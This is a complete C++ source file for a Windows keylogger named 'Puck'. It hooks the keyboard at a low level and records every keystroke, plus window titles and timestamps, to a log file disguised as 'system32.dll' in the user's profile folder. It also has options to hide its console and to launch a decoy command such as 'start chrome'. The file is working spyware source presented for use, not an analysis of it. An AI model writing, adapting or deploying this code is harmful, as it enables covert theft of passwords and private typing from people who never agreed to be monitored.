/*
 * Copyright 2020 Samuel Rowe
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
*/

#include <cstdio>
#include <iostream>
#include <fstream>
#include <time.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

/* Comment out the following definition if the console window should be hidden. */
#define PUCK_VISIBLE false
/* The command that is executed when the keylogger launches. */
#define PUCK_COMMAND "start chrome"
/* The title of the message box when an error occurs. */
#define PUCK_FAILURE_TITLE "Jingle Bells!"
/* The message of the message box when an error occurs. */
#define PUCK_FAILURE_MESSAGE "Looks like Santa Claus is coming to town early this year."
/* The name of the output file. */
#define PUCK_OUTPUT_FILE "system32.dll"
/* The unique identifier which prevents multiple instances of the keylogger from executing. */
#define PUCK_MUTEX_NAME "83.0x5319.puck"

HHOOK hook;
std::ofstream output;
char previousWindowTitle[256];
HANDLE mutex;

void activateHook();
int logKey(int keyStroke);
LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam);

void activateHook() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, NULL, 0);
	if (!hook) {
		MessageBox(NULL, PUCK_FAILURE_MESSAGE, PUCK_FAILURE_TITLE, MB_ICONERROR);
	}
}

void shutdown() {
	UnhookWindowsHookEx(hook);

    ReleaseMutex(mutex);
    CloseHandle(mutex);
}

int logKey(int keyStroke) {
    char previousWindowTitle[256];

	if ((keyStroke == 1) || (keyStroke == 2)) {
		return 0; // ignore mouse clicks
    }

	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char windowTitle[256];
        GetWindowText(foreground, windowTitle, 256);

        if(strcmp(windowTitle, previousWindowTitle) != 0) {
            strcpy(previousWindowTitle, windowTitle);

            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            output << "\n\n["<< windowTitle << " - at " << s << "]\n";
        }
    }

	switch (keyStroke) {
        case VK_BACK:
            output << "[BACKSPACE]";
            break;

        case VK_RETURN:
		output << "[ENTER]\n";
        break;

        case VK_SPACE:
            output << " ";
            break;

        case VK_TAB:
            output << "[TAB]";
            break;

        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            output << "[SHIFT]";
            break;

        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            output << "[CONTROL]";
            break;

        case VK_ESCAPE:
            output << "[ESCAPE]";
            break;

        case VK_END:
            output << "[END]";
            break;

        case VK_HOME:
            output << "[HOME]";
            break;

        case VK_LEFT:
            output << "[LEFT]";
            break;

        case VK_UP:
            output << "[UP]";
            break;

        case VK_RIGHT:
            output << "[RIGHT]";
            break;

        case VK_DOWN:
            output << "[DOWN]";
            break;

        case 190:
        case 110:
            output << ".";
            break;

        case 189:
        case 109:
            output << "-";
            break;

        case 20:
            output << "[CAPSLOCK]";
            break;

        default: {
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
                (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
                lowercase = !lowercase;
            }

            char key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);

            if (!lowercase) {
                key = tolower(key);
            }

            output << char(key);
        }
    }

    output.flush();

    return 0;
}

LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			/* lParam is a pointer to the structure containing the data needed.
             * Therefore, cast it.
             */
			KBDLLHOOKSTRUCT data = *((KBDLLHOOKSTRUCT*)lParam);

			/* Translate the key pressed and save it to the output file. */
			logKey(data.vkCode);
		}
	}

	/* Call the next hook in the hook chain. This is nessecary or your hook chain
     * will break and the hook stops.
     */
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void initialize(const char* outputFile) {
    std::string path = getenv("USERPROFILE");
    path += "\\";
    path += outputFile;

    /* Open the output file in append mode. */
    output.open(path, std::ios_base::app);

    std::cout << "[info] The log file is located at " << path << "\n";

    activateHook();
}

bool isDuplicateInstance() {
    mutex = CreateMutex(NULL, TRUE, PUCK_MUTEX_NAME);
    return GetLastError() == ERROR_ALREADY_EXISTS;
}

int32_t main(int32_t length, char** arguments) {
    const char* command = PUCK_COMMAND;
    const char* outputFile = PUCK_OUTPUT_FILE;
    int32_t result = 0;
    for (int32_t i = 1; i < length; i++) {
        if (strcmp(arguments[i], "--command") == 0) {
            if (i + 1 < length) {
                command = arguments[++i];
            }
            else {
                std::cout << "[error] The `--command` flag expects an argument.\n";
                result = 1;
            }
        }
        else if (strcmp(arguments[i], "--output") == 0) {
            if (i + 1 < length) {
                outputFile = arguments[++i];
            }
            else {
                std::cout << "[error] The `--output` flag expects an argument.\n";
                result = 1;
            }
        }
        else if (strcmp(arguments[i], "--help") == 0) {
            std::cout << "Puck v1.0\n"
                << "puck [--command <string>] [--output <string>] [--visible|--invisible] [--help]\n"
                << "\t--command <string>\tExecutes the specified command.\n"
                << "\t--output <string>\tRecords the keystrokes to the specified file.\n"
                << "\t--help\t\t\tPrints the help message.\n";
            result = 1;
        }
    }

    if (result == 0) {
        /* Execute the command even if the keylogger is already running. */
        std::cout << "[info] Executing command '" << command << "'\n";
        system(command);

        if (isDuplicateInstance()) {
            std::cout << "[error] The keylogger is already running.\n";
            result = 1;
        }
        else {
            initialize(outputFile);
            std::cout << "[info] Keylogger started...\n";
            MSG message;
            while (GetMessage(&message, NULL, 0, 0)) {
                Sleep(1000);
            }

            shutdown();
        }
    }

    return result;
}